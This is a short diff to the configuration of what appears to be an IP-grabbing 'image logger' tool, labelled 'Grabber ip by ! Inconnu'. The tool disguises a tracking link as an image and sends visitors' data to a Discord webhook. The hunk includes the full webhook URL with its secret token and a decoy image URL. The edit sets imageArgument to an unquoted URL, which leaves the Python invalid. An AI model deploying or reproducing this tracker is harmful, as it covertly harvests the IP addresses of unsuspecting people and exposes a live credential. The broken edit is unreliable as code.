@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1130225907777421503/5tHm5SACn6dHUaYTZ3nzaCAIrI_N5atMGqKmURgRR6e4vS1qQ4SIEDnHVALIbDcQ29G5",
     "image": "https://www.tvsrennes.com/ressources/images/88ed7338d197.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": https://cdn.discordapp.com/guilds/1081415481392640080/users/988164443747786833/avatars/a_e7d833820adfc98490c41b1cb978a969.gif?size=160, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Grabber ip by ! Inconnu ", # Set this to the name you want the webhook to have
